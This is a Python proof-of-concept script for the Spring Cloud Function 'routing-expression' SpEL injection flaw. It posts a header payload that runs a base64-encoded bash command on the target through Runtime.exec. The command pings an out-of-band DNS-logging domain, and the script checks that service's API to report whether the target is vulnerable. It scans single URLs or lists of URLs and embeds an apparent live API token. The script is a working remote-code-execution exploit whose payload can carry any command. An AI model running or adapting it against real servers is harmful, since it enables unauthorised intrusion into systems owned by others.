import requests
from optparse import OptionParser
import base64
import re

requests.packages.urllib3.disable_warnings()

configurations={
    'api_domain':'yf76lj.ceye.io',
    'api_token':'ba9041dc8771a4e2b61d90b270c5c501',
    'request_type':'dns'
}

headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36'
}

def get_args():
    usage='%prog -u <url>'
    parser=OptionParser(usage=usage)
    parser.add_option('-u','--url',dest='url',help='指定单个目标url')
    parser.add_option('-f','--file',dest='file',help='指定目标文件')
    options,args=parser.parse_args()
    return options

def encoder(s):
    bs=base64.b64encode(s.encode('utf-8'))
    return bs

def poc(url):
    target_url=url.strip('/')+'/functionRouter'
    target_ip=re.findall('//(.*?)/',target_url)[0]
    if ':' in target_ip:
        target_ip=target_ip.split(':')[0]
    p1='ping -c 4 '+target_ip+'.'+configurations['api_domain']
    p2=encoder(p1)
    payload='T(java.lang.Runtime).getRuntime().exec("bash -c {echo,' + str(p2,'utf-8') + '}|{base64,-d}|{bash,-i}")'
    headers['spring.cloud.function.routing-expression']=payload
    post_data='test'
    try:
        res=requests.post(url=target_url,headers=headers,data=post_data,timeout=2)
    except:
        pass
    try:
        verify_url='http://api.ceye.io/v1/records?token='+configurations['api_token']+'&type='+configurations['request_type']+'&filter='+configurations['api_domain']
        verify = requests.get(url=verify_url)
        result=re.findall('"name": "(.*?).'+configurations['api_domain']+'"', verify.text)
        if target_ip in result:
            print("\033[31;1m[+]" + target_url + "存在漏洞！"+"\033[0m")
        else:
            print("\033[32m[-]" + target_url + "不存在漏洞" +"\033[0m")
    except:
        print('ceye配置错误')

def pocs(filepath):
    urls = [x.strip() for x in open(filepath,"r").readlines()]
    for url in urls:
        poc(url)

def main():
    options=get_args()
    url=options.url
    file_path=options.file
    if url is not None and file_path is None:
        poc(url)
    elif url is None and file_path is not None:
        pocs(file_path)

if __name__=="__main__":
    try:
        main()
    except:
        print('use -h see how to use')
